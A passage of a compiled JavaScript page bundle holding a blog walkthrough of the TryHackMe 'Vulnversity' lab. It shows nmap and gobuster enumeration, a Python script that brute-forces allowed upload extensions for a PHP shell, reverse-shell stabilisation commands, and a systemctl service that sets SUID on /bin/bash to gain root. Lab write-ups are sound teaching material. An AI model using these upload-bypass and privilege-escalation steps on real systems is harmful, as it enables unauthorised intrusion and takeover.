import{S as Yi,i as ep,s as tp,W as Xn,w as u,x as h,y as v,Z as sp,_ as Zi,f as F,t as m,z as E,$ as ji,k as l,q as n,a as i,T as ul,l as a,m as o,r,h as t,c as p,U as hl,n as _,b as d,D as e,E as lp}from"../../../../chunks/index-9671d79c.js";import{P as ap}from"../../../../chunks/post_layout-76c250d8.js";import{I as y}from"../../../../chunks/post_card-ea1dea7e.js";function op(qe){let f,O,k,le,g,L,R,Mi=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF"><div class='code-container'><code><div class='line'><span style="color: undefined">nmap -sC -sV -A -T4 -v -oN scan/nmap 10.10.104.250 -Pn</span></div></code></div></pre>`,bt,Ge,Re,Ml,w,Ze,Lt,Kl,Jl,Ql,je,It,Xl,Yl,ea,ze,At,ta,sa,la,Me,Ct,aa,oa,na,Ke,Tt,ra,ia,pa,Je,xt,ca,da,fa,Qe,Ot,ua,ha,vl,Z,Ut,St,Pt,va,Fa,Wt,ae,Fl,oe,Xe,ma,ml,D,Ye,Ea,Nt,ya,ga,j,_a,Bt,wa,Da,Ht,Vt,ne,$a,U,ka,qt,ba,La,Gt,Ia,Aa,Rt,Zt,re,Ca,W,Ta,jt,xa,Oa,zt,Ua,Mt,Kt,ie,Sa,S,Pa,Jt,Wa,Na,Qt,Ba,Ha,Xt,Yt,pe,Va,ce,qa,es,Ga,ts,ss,de,El,fe,et,Ra,yl,z,Za,ls,ja,za,gl,tt,Ma,_l,N,Ka,M,Ja,Qa,as,Xa,wl,st,os,Ya,Dl,lt,ns,eo,$l,K,at,to,x,ot,rs,so,lo,ao,nt,is,oo,no,ro,rt,ps,io,po,co,it,cs,fo,uo,ho,B,vo,ds,Fo,mo,fs,Eo,yo,kl,us,Ki=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" bash="true"><div class="language-id">bash</div><div class='code-container'><code><div class='line'><span style="color: #EEFFFF">gobuster dir -u http://10.10.104.250:3333 -w /usr/share/wordlists/dirb/big.txt -t 50 </span><span style="color: #89DDFF">2&gt;</span><span style="color: #EEFFFF">/dev/null </span><span style="color: #89DDFF">|</span><span style="color: #EEFFFF"> tee gobuster.log</span></div><div class='line'></div></code></div></pre>`,hs,J,vs,ue,go,Fs,_o,wo,Do,he,ve,$o,ms,ko,bo,Lo,H,Es,Fe,Io,ys,Ao,Co,gs,me,bl,Ee,pt,To,Ll,P,ct,xo,ye,_s,ge,Oo,ws,_e,Uo,dt,So,we,Ds,De,Po,$s,$e,Wo,ks,No,Il,bs,Ji=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" python="true"><div class="language-id">python</div><div class='code-container'><code><div class='line'><span style="color: #546E7A">#!/usr/bin/python3</span></div><div class='line'><span style="color: #89DDFF">import</span><span style="color: #EEFFFF"> requests</span></div><div class='line'><span style="color: #89DDFF">from</span><span style="color: #EEFFFF"> os </span><span style="color: #89DDFF">import</span><span style="color: #EEFFFF"> rename</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">ip </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">10.10.104.250</span><span style="color: #89DDFF">"</span></div><div class='line'><span style="color: #EEFFFF">url </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #C792EA">f</span><span style="color: #C3E88D">"http://</span><span style="color: #EEFFFF">&#123;ip&#125;</span><span style="color: #C3E88D">:3333/internal/index.php"</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">extensions </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">[</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">.php</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">.php3</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">.php4</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">.php5</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">.php6</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">.phtml</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">]</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">old_file </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">shell.php</span><span style="color: #89DDFF">"</span></div><div class='line'><span style="color: #EEFFFF">file_name </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">shell</span><span style="color: #89DDFF">"</span></div><div class='line'></div><div class='line'><span style="color: #89DDFF">for</span><span style="color: #EEFFFF"> ext </span><span style="color: #89DDFF">in</span><span style="color: #EEFFFF"> extensions</span><span style="color: #89DDFF">:</span></div><div class='line'><span style="color: #EEFFFF">	new_file </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> file_name </span><span style="color: #89DDFF">+</span><span style="color: #EEFFFF"> ext</span></div><div class='line'><span style="color: #EEFFFF">	</span><span style="color: #546E7A">#print(file)</span></div><div class='line'><span style="color: #EEFFFF">	</span><span style="color: #82AAFF">rename</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">old_file</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> new_file</span><span style="color: #89DDFF">)</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">	files </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">file</span><span style="color: #89DDFF">"</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">:</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">open</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">new_file</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">rb</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">)&#125;</span></div><div class='line'><span style="color: #EEFFFF">	r </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> requests</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">post</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">url</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> </span><span style="color: #EEFFFF">files</span><span style="color: #89DDFF">=</span><span style="color: #82AAFF">files</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #EEFFFF">	</span><span style="color: #546E7A">#print(r.text)	</span></div><div class='line'><span style="color: #EEFFFF">	</span><span style="color: #89DDFF">if</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">Extension not allowed</span><span style="color: #89DDFF">"</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">in</span><span style="color: #EEFFFF"> r</span><span style="color: #89DDFF">.</span><span style="color: #F07178">text</span><span style="color: #89DDFF">:</span></div><div class='line'><span style="color: #EEFFFF">		</span><span style="color: #82AAFF">print</span><span style="color: #89DDFF">(</span><span style="color: #C792EA">f</span><span style="color: #C3E88D">"</span><span style="color: #82AAFF">&#123;ext&#125;</span><span style="color: #C3E88D"> not allowed"</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #EEFFFF">	</span><span style="color: #89DDFF">else</span><span style="color: #89DDFF">:</span></div><div class='line'><span style="color: #EEFFFF">		</span><span style="color: #82AAFF">print</span><span style="color: #89DDFF">(</span><span style="color: #C792EA">f</span><span style="color: #C3E88D">"</span><span style="color: #82AAFF">&#123;ext&#125;</span><span style="color: #C3E88D"> allowed!!"</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #EEFFFF">		</span><span style="color: #89DDFF">break</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">	old_file </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> new_file</span></div><div class='line'></div></code></div></pre>`,Ls,I,Q,Bo,Is,Ho,Vo,As,Cs,ke,qo,ft,Go,be,Ts,Le,Ro,xs,Ie,Zo,ut,jo,V,Os,Ae,zo,Us,Ce,Mo,Ss,Te,Ko,Ps,Jo,Al,Ws,Qi=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF"><div class='code-container'><code><div class='line'><span style="color: undefined">python3 -c 'import pty;pty.spawn("/bin/bash")'</span></div><div class='line'><span style="color: undefined">export TERM=xterm</span></div><div class='line'><span style="color: undefined">Ctrl + Z</span></div><div class='line'><span style="color: undefined">stty raw -echo; fg</span></div></code></div></pre>`,Ns,ht,xe,Qo,Bs,Xo,Hs,Vs,Oe,Cl,Ue,vt,Yo,Tl,$,qs,Ft,en,X,tn,sn,Gs,mt,ln,Rs,an,on,Se,Zs,nn,rn,js,zs,Pe,pn,We,Et,Y,cn,dn,fn,Ms,Ks,Ne,un,Js,A,hn,Qs,vn,Fn,Xs,mn,En,Ys,yn,gn,el,_n,wn,tl,q,Dn,sl,$n,kn,ll,bn,Ln,xl,al,Xi=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF"><div class='code-container'><code><div class='line'><span style="color: undefined">TF=$(mktemp).service</span></div><div class='line'><span style="color: undefined">echo '[Service]</span></div><div class='line'><span style="color: undefined">Type=oneshot</span></div><div class='line'><span style="color: undefined">ExecStart=/bin/sh -c "chmod +s /bin/bash"</span></div><div class='line'><span style="color: undefined">[Install]</span></div><div class='line'><span style="color: undefined">WantedBy=multi-user.target' &gt; $TF</span></div><div class='line'><span style="color: undefined">systemctl link $TF</span></div><div class='line'><span style="color: undefined">systemctl enable --now $TF</span></div></code></div></pre>`,ol,yt,ee,In,nl,An,Cn,rl,il,Be,Ol;return ae=new y({props:{src:"/assets/nmap_thm.png"}}),ne=new y({props:{src:"https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/13.png"}}),re=new y({props:{src:"https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/14.png"}}),ie=new y({props:{src:"https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/15.png"}}),pe=new y({props:{src:"https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/16.png"}}),de=new y({props:{src:"https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/17.png"}}),Fe=new y({props:{src:"https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/18.png"}}),me=new y({props:{src:"https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/19.png"}}),ge=new y({props:{src:"https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/110.png"}}),_e=new y({props:{src:"https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/111.png"}}),De=new y({props:{src:"https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/112.png"}}),$e=new y({props:{src:"https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/113.png"}}),ke=new y({props:{src:"https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/114.png"}}),Le=new y({props:{src:"https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/115.png"}}),Ie=new y({props:{src:"https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/116.png"}}),Ae=new y({props:{src:"https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/117.png"}}),Ce=new y({props:{src:"https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/118.png"}}),Te=new y({props:{src:"https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/119.png"}}),Oe=new y({props:{src:"https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/120.png"}}),Pe=new y({props:{src:"https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/121.png"}}),Ne=new y({props:{src:"https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/122.png"}}),Be=new y({props:{src:"https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/123.png"}}),{c(){f=l("p"),O=n("This a walk-through of TryHackme room "),k=l("a"),le=n("Vulnversity"),g=n(". As always we start with the enumeration using nmap."),L=i(),R=new ul(!1),bt=i(),Ge=l("ul"),Re=l("li"),Ml=n("Let’s break it down "),w=l("ul"),Ze=l("li"),Lt=l("code"),Kl=n("-sC"),Jl=n(" for default scripts"),Ql=i(),je=l("li"),It=l("code"),Xl=n("-sV"),Yl=n(" service version of the services running"),ea=i(),ze=l("li"),At=l("code"),ta=n("-A"),sa=n(" aggresive scan"),la=i(),Me=l("li"),Ct=l("code"),aa=n("-T4"),oa=n(" speed of the scan"),na=i(),Ke=l("li"),Tt=l("code"),ra=n("-v"),ia=n(" for verbosity"),pa=i(),Je=l("li"),xt=l("code"),ca=n("-oN"),da=n(" save the output to a normal file"),fa=i(),Qe=l("li"),Ot=l("code"),ua=n("-Pn"),ha=n(" don’t ping the target assuming the host is live"),vl=i(),Z=l("ul"),Ut=l("li"),St=l("strong"),Pt=l("em"),va=n("Enumeration"),Fa=i(),Wt=l("li"),u(ae.$$.fragment),Fl=i(),oe=l("h6"),Xe=l("a"),ma=n("Task 2"),ml=i(),D=l("ul"),Ye=l("li"),Ea=n("So we can see there are 6 ports open; "),Nt=l("code"),ya=n("21, 22, 139, 445, 3128, 3333"),ga=i(),j=l("li"),_a=n("Due to running a service version scan ("),Bt=l("code"),wa=n("-sV"),Da=n(") we can see the version of the squid proxy running on port 3128"),Ht=l("ul"),Vt=l("li"),u(ne.$$.fragment),$a=i(),U=l("li"),ka=n("The "),qt=l("code"),ba=n("-p-400"),La=n(" will run a scan on the first "),Gt=l("code"),Ia=n("400"),Aa=n(" ports "),Rt=l("ul"),Zt=l("li"),u(re.$$.fragment),Ca=i(),W=l("li"),Ta=n("The "),jt=l("code"),xa=n("-n"),Oa=n(" will not resolve "),zt=l("code"),Ua=n("DNS"),Mt=l("ul"),Kt=l("li"),u(ie.$$.fragment),Sa=i(),S=l("li"),Pa=n("By the http banner we can see the system is running "),Jt=l("code"),Wa=n("Ubuntu"),Na=n(". We can also user the "),Qt=l("code"),Ba=n("-O"),Ha=n(" option to do OS detection "),Xt=l("ul"),Yt=l("li"),u(pe.$$.fragment),Va=i(),ce=l("li"),qa=n("The web-server is running on "),es=l("code"),Ga=n("3333"),ts=l("ul"),ss=l("li"),u(de.$$.fragment),El=i(),fe=l("h6"),et=l("a"),Ra=n("Task 3"),yl=i(),z=l("p"),Za=n("For this section we will use the tool "),ls=l("code"),ja=n("gobuster"),za=n("."),gl=i(),tt=l("p"),Ma=n("GoBuster is a tool used to brute-force URIs (directories and files), DNS subdomains and virtual host names. For this machine, we will focus on using it to brute-force directories."),_l=i(),N=l("p"),Ka=n("Download GoBuster "),M=l("a"),Ja=n("here"),Qa=n(", or if you’re on Kali Linux 2020.1+ run "),as=l("code"),Xa=n("sudo apt-get install gobuster"),wl=i(),st=l("ul"),os=l("li"),Ya=n("Let’s start the directory listing."),Dl=i(),lt=l("p"),ns=l("code"),eo=n("gobuster dir -u http://10.10.104.250:3333 -w /usr/share/wordlists/dirb/big.txt -t 50"),$l=i(),K=l("ul"),at=l("li"),to=n("Break down"),x=l("ul"),ot=l("li"),rs=l("code"),so=n("dir"),lo=n(" to let gobuster know we’re doing directory brute-forcing"),ao=i(),nt=l("li"),is=l("code"),oo=n("-u"),no=n(" to specify the url"),ro=i(),rt=l("li"),ps=l("code"),io=n("-w"),po=n(" to specify the wordlist"),co=i(),it=l("li"),cs=l("code"),fo=n("-t"),uo=n(" to specify threads(speed). I found 50 works well. Anything more than 60 gives errors."),ho=i(),B=l("li"),vo=n("If you still get errors you can remove them by using "),ds=l("code"),Fo=n("2>/dev/null"),mo=n(" which will redirect the errors to "),fs=l("code"),Eo=n("/dev/null"),yo=n(" dir which is practically no-where. The command will look like this"),kl=i(),us=new ul(!1),hs=i(),J=l("ul"),vs=l("li"),ue=l("p"),go=n("Using tee to save the output only. I personally don’t like the "),Fs=l("code"),_o=n("-o"),wo=n(" option which gobuster provides"),Do=i(),he=l("li"),ve=l("p"),$o=n("We can see there is a "),ms=l("code"),ko=n("internal"),bo=n(" dir gobuster found"),Lo=i(),H=l("ul"),Es=l("li"),u(Fe.$$.fragment),Io=i(),ys=l("li"),Ao=n("Navigating to this dir we can see there is a upload form"),Co=i(),gs=l("li"),u(me.$$.fragment),bl=i(),Ee=l("h6"),pt=l("a"),To=n("Task 4"),Ll=i(),P=l("ul"),ct=l("li"),xo=n("Let’s see what we can do with it. At first we should see what files we are allowed upload. I tried uploading a jpg file "),ye=l("ul"),_s=l("li"),u(ge.$$.fragment),Oo=i(),ws=l("li"),u(_e.$$.fragment),Uo=i(),dt=l("li"),So=n("It’s not allowed. We can try uploading a php file. See if we can get the php info"),we=l("ul"),Ds=l("li"),u(De.$$.fragment),Po=i(),$s=l("li"),u($e.$$.fragment),Wo=i(),ks=l("li"),No=n("We can’t upload any php file. If we do this manually it’ll take unnecessary time & effort. Let’s automate this process. First we have to see how the file upload is working. We can use burp or simply the network tab of our browser. We can use burp to check which extension will not be blocked. But I’ll write a simple python script to do this."),Il=i(),bs=new ul(!1),Ls=i(),I=l("ul"),Q=l("li"),Bo=n("So this script is basically going through each extension of the extensions list & checking if the file extension is allowed or not & renaming it then sending the file to the web-server using the requests module. So we can the "),Is=l("code"),Ho=n(".phtml"),Vo=n(" is allowed"),As=l("ul"),Cs=l("li"),u(ke.$$.fragment),qo=i(),ft=l("li"),Go=n("Rev-shell time. I’m using the one which comes default with kali(pentestmoney).In the shell we have to change these 2 variables"),be=l("ul"),Ts=l("li"),u(Le.$$.fragment),Ro=i(),xs=l("li"),u(Ie.$$.fragment),Zo=i(),ut=l("li"),jo=n("Success. Next setup a netcat listener & navigate to the file on the server."),V=l("ul"),Os=l("li"),u(Ae.$$.fragment),zo=i(),Us=l("li"),u(Ce.$$.fragment),Mo=i(),Ss=l("li"),u(Te.$$.fragment),Ko=i(),Ps=l("li"),Jo=n("We got the shell but it’s limited. We have to stabilize it."),Al=i(),Ws=new ul(!1),Ns=i(),ht=l("ul"),xe=l("li"),Qo=n("We got the user flag. User is "),Bs=l("code"),Xo=n("Bill"),Hs=l("ul"),Vs=l("li"),u(Oe.$$.fragment),Cl=i(),Ue=l("h6"),vt=l("a"),Yo=n("Task 5"),Tl=i(),$=l("ul"),qs=l("li"),Ft=l("p"),en=n("Now Privilege Escalation. As this task suggests we’re gonna search for "),X=l("a"),tn=n("SUID binaries"),sn=i(),Gs=l("li"),mt=l("p"),ln=n("Search for SUID bits on the machine "),Rs=l("code"),an=n("find / -perm -u=s -type f 2>/dev/null"),on=i(),Se=l("li"),Zs=l("p"),nn=n("There is an unusual binary here"),rn=i(),js=l("ul"),zs=l("li"),u(Pe.$$.fragment),pn=i(),We=l("li"),Et=l("p"),Y=l("a"),cn=n("GTFO bins"),dn=n(" is the goto for any kind of binary based Privilege Escalation."),fn=i(),Ms=l("ul"),Ks=l("li"),u(Ne.$$.fragment),un=i(),Js=l("li"),A=l("p"),hn=n("So we’ll make a "),Qs=l("code"),vn=n("System service"),Fn=n(" named "),Xs=l("code"),mn=n("systemctl"),En=n(" & run it using it’s relative path "),Ys=l("code"),yn=n("./systemctl"),gn=n(" & we’ll execute the command "),el=l("code"),_n=n('/bin/bash -c "id > /tmp/output"'),wn=i(),tl=l("li"),q=l("p"),Dn=n("The above method dosen’t work so I used this one. This one is simple I’m creating a service and giving "),sl=l("code"),$n=n("/bin/bash"),kn=n(" SUID permission with "),ll=l("code"),bn=n("+s"),Ln=n(" option. Then executing it using the original systemctl binary."),xl=i(),al=new ul(!1),ol=i(),yt=l("ul"),ee=l("li"),In=n("If we do "),nl=l("code"),An=n("bash -p"),Cn=n(" now we can see we have effective id as root. So we own the system now"),rl=l("ul"),il=l("li"),u(Be.$$.fragment),this.h()},l(s){f=a(s,"P",{});var c=o(f);O=r(c,"This a walk-through of TryHackme room "),k=a(c,"A",{href:!0,rel:!0,target:!0});var Yn=o(k);le=r(Yn,"Vulnversity"),Yn.forEach(t),g=r(c,". As always we start with the enumeration using nmap."),c.forEach(t),L=p(s),R=hl(s,!1),bt=p(s),Ge=a(s,"UL",{});var er=o(Ge);Re=a(er,"LI",{});var Tn=o(Re);Ml=r(Tn,"Let’s break it down "),w=a(Tn,"UL",{});var b=o(w);Ze=a(b,"LI",{});var xn=o(Ze);Lt=a(xn,"CODE",{});var tr=o(Lt);Kl=r(tr,"-sC"),tr.forEach(t),Jl=r(xn," for default scripts"),xn.forEach(t),Ql=p(b),je=a(b,"LI",{});var On=o(je);It=a(On,"CODE",{});var sr=o(It);Xl=r(sr,"-sV"),sr.forEach(t),Yl=r(On," service version of the services running"),On.forEach(t),ea=p(b),ze=a(b,"LI",{});var Un=o(ze);At=a(Un,"CODE",{});var lr=o(At);ta=r(lr,"-A"),lr.forEach(t),sa=r(Un," aggresive scan"),Un.forEach(t),la=p(b),Me=a(b,"LI",{});var Sn=o(Me);Ct=a(Sn,"CODE",{});var ar=o(Ct);aa=r(ar,"-T4"),ar.forEach(t),oa=r(Sn," speed of the scan"),Sn.forEach(t),na=p(b),Ke=a(b,"LI",{});var Pn=o(Ke);Tt=a(Pn,"CODE",{});var or=o(Tt);ra=r(or,"-v"),or.forEach(t),ia=r(Pn," for verbosity"),Pn.forEach(t),pa=p(b),Je=a(b,"LI",{});var Wn=o(Je);xt=a(Wn,"CODE",{});var nr=o(xt);ca=r(nr,"-oN"),nr.forEach(t),da=r(Wn," save the output to a normal file"),Wn.forEach(t),fa=p(b),Qe=a(b,"LI",{});var Nn=o(Qe);Ot=a(Nn,"CODE",{});var rr=o(Ot);ua=r(rr,"-Pn"),rr.forEach(t),ha=r(Nn," don’t ping the target assuming the host is live"),Nn.forEach(t),b.forEach(t),Tn.forEach(t),er.forEach(t),vl=p(s),Z=a(s,"UL",{});var Ul=o(Z);Ut=a(Ul,"LI",{});var ir=o(Ut);St=a(ir,"STRONG",{});var pr=o(St);Pt=a(pr,"EM",{});var cr=o(Pt);va=r(cr,"Enumeration"),cr.forEach(t),pr.forEach(t),ir.forEach(t),Fa=p(Ul),Wt=a(Ul,"LI",{});var dr=o(Wt);h(ae.$$.fragment,dr),dr.forEach(t),Ul.forEach(t),Fl=p(s),oe=a(s,"H6",{id:!0});var fr=o(oe);Xe=a(fr,"A",{href:!0});var ur=o(Xe);ma=r(ur,"Task 2"),ur.forEach(t),fr.forEach(t),ml=p(s),D=a(s,"UL",{});var C=o(D);Ye=a(C,"LI",{});var Bn=o(Ye);Ea=r(Bn,"So we can see there are 6 ports open; "),Nt=a(Bn,"CODE",{});var hr=o(Nt);ya=r(hr,"21, 22, 139, 445, 3128, 3333"),hr.forEach(t),Bn.forEach(t),ga=p(C),j=a(C,"LI",{});var pl=o(j);_a=r(pl,"Due to running a service version scan ("),Bt=a(pl,"CODE",{});var vr=o(Bt);wa=r(vr,"-sV"),vr.forEach(t),Da=r(pl,") we can see the version of the squid proxy running on port 3128"),Ht=a(pl,"UL",{});var Fr=o(Ht);Vt=a(Fr,"LI",{});var mr=o(Vt);h(ne.$$.fragment,mr),mr.forEach(t),Fr.forEach(t),pl.forEach(t),$a=p(C),U=a(C,"LI",{});var He=o(U);ka=r(He,"The "),qt=a(He,"CODE",{});var Er=o(qt);ba=r(Er,"-p-400"),Er.forEach(t),La=r(He," will run a scan on the first "),Gt=a(He,"CODE",{});var yr=o(Gt);Ia=r(yr,"400"),yr.forEach(t),Aa=r(He," ports "),Rt=a(He,"UL",{});var gr=o(Rt);Zt=a(gr,"LI",{});var _r=o(Zt);h(re.$$.fragment,_r),_r.forEach(t),gr.forEach(t),He.forEach(t),Ca=p(C),W=a(C,"LI",{});var gt=o(W);Ta=r(gt,"The "),jt=a(gt,"CODE",{});var wr=o(jt);xa=r(wr,"-n"),wr.forEach(t),Oa=r(gt," will not resolve "),zt=a(gt,"CODE",{});var Dr=o(zt);Ua=r(Dr,"DNS"),Dr.forEach(t),Mt=a(gt,"UL",{});var $r=o(Mt);Kt=a($r,"LI",{});var kr=o(Kt);h(ie.$$.fragment,kr),kr.forEach(t),$r.forEach(t),gt.forEach(t),Sa=p(C),S=a(C,"LI",{});var Ve=o(S);Pa=r(Ve,"By the http banner we can see the system is running "),Jt=a(Ve,"CODE",{});var br=o(Jt);Wa=r(br,"Ubuntu"),br.forEach(t),Na=r(Ve,". We can also user the "),Qt=a(Ve,"CODE",{});var Lr=o(Qt);Ba=r(Lr,"-O"),Lr.forEach(t),Ha=r(Ve," option to do OS detection "),Xt=a(Ve,"UL",{});var Ir=o(Xt);Yt=a(Ir,"LI",{});var Ar=o(Yt);h(pe.$$.fragment,Ar),Ar.forEach(t),Ir.forEach(t),Ve.forEach(t),Va=p(C),ce=a(C,"LI",{});var Sl=o(ce);qa=r(Sl,"The web-server is running on "),es=a(Sl,"CODE",{});var Cr=o(es);Ga=r(Cr,"3333"),Cr.forEach(t),ts=a(Sl,"UL",{});var Tr=o(ts);ss=a(Tr,"LI",{});var xr=o(ss);h(de.$$.fragment,xr),xr.forEach(t),Tr.forEach(t),Sl.forEach(t),C.forEach(t),El=p(s),fe=a(s,"H6",{id:!0});var Or=o(fe);et=a(Or,"A",{href:!0});var Ur=o(et);Ra=r(Ur,"Task 3"),Ur.forEach(t),Or.forEach(t),yl=p(s),z=a(s,"P",{});var Pl=o(z);Za=r(Pl,"For this section we will use the tool "),ls=a(Pl,"CODE",{});var Sr=o(ls);ja=r(Sr,"gobuster"),Sr.forEach(t),za=r(Pl,"."),Pl.forEach(t),gl=p(s),tt=a(s,"P",{});var Pr=o(tt);Ma=r(Pr,"GoBuster is a tool used to brute-force URIs (directories and files), DNS subdomains and virtual host names. For this machine, we will focus on using it to brute-force directories."),Pr.forEach(t),_l=p(s),N=a(s,"P",{});var cl=o(N);Ka=r(cl,"Download GoBuster "),M=a(cl,"A",{href:!0,rel:!0,target:!0});var Wr=o(M);Ja=r(Wr,"here"),Wr.forEach(t),Qa=r(cl,", or if you’re on Kali Linux 2020.1+ run "),as=a(cl,"CODE",{});var Nr=o(as);Xa=r(Nr,"sudo apt-get install gobuster"),Nr.forEach(t),cl.forEach(t),wl=p(s),st=a(s,"UL",{});var Br=o(st);os=a(Br,"LI",{});var Hr=o(os);Ya=r(Hr,"Let’s start the directory listing."),Hr.forEach(t),Br.forEach(t),Dl=p(s),lt=a(s,"P",{});var Vr=o(lt);ns=a(Vr,"CODE",{});var qr=o(ns);eo=r(qr,"gobuster dir -u http://10.10.104.250:3333 -w /usr/share/wordlists/dirb/big.txt -t 50"),qr.forEach(t),Vr.forEach(t),$l=p(s),K=a(s,"UL",{});var Wl=o(K);at=a(Wl,"LI",{});var Hn=o(at);to=r(Hn,"Break down"),x=a(Hn,"UL",{});var te=o(x);ot=a(te,"LI",{});var Vn=o(ot);rs=a(Vn,"CODE",{});var Gr=o(rs);so=r(Gr,"dir"),Gr.forEach(t),lo=r(Vn," to let gobuster know we’re doing directory brute-forcing"),Vn.forEach(t),ao=p(te),nt=a(te,"LI",{});var qn=o(nt);is=a(qn,"CODE",{});var Rr=o(is);oo=r(Rr,"-u"),Rr.forEach(t),no=r(qn," to specify the url"),qn.forEach(t),ro=p(te),rt=a(te,"LI",{});var Gn=o(rt);ps=a(Gn,"CODE",{});var Zr=o(ps);io=r(Zr,"-w"),Zr.forEach(t),po=r(Gn," to specify the wordlist"),Gn.forEach(t),co=p(te),it=a(te,"LI",{});var Rn=o(it);cs=a(Rn,"CODE",{});var jr=o(cs);fo=r(jr,"-t"),jr.forEach(t),uo=r(Rn," to specify threads(speed). I found 50 works well. Anything more than 60 gives errors."),Rn.forEach(t),te.forEach(t),Hn.forEach(t),ho=p(Wl),B=a(Wl,"LI",{});var _t=o(B);vo=r(_t,"If you still get errors you can remove them by using "),ds=a(_t,"CODE",{});var zr=o(ds);Fo=r(zr,"2>/dev/null"),zr.forEach(t),mo=r(_t," which will redirect the errors to "),fs=a(_t,"CODE",{});var Mr=o(fs);Eo=r(Mr,"/dev/null"),Mr.forEach(t),yo=r(_t," dir which is practically no-where. The command will look like this"),_t.forEach(t),Wl.forEach(t),kl=p(s),us=hl(s,!1),hs=p(s),J=a(s,"UL",{});var Nl=o(J);vs=a(Nl,"LI",{});var Kr=o(vs);ue=a(Kr,"P",{});var Bl=o(ue);go=r(Bl,"Using tee to save the output only. I personally don’t like the "),Fs=a(Bl,"CODE",{});var Jr=o(Fs);_o=r(Jr,"-o"),Jr.forEach(t),wo=r(Bl," option which gobuster provides"),Bl.forEach(t),Kr.forEach(t),Do=p(Nl),he=a(Nl,"LI",{});var Hl=o(he);ve=a(Hl,"P",{});var Vl=o(ve);$o=r(Vl,"We can see there is a "),ms=a(Vl,"CODE",{});var Qr=o(ms);ko=r(Qr,"internal"),Qr.forEach(t),bo=r(Vl," dir gobuster found"),Vl.forEach(t),Lo=p(Hl),H=a(Hl,"UL",{});var wt=o(H);Es=a(wt,"LI",{});var 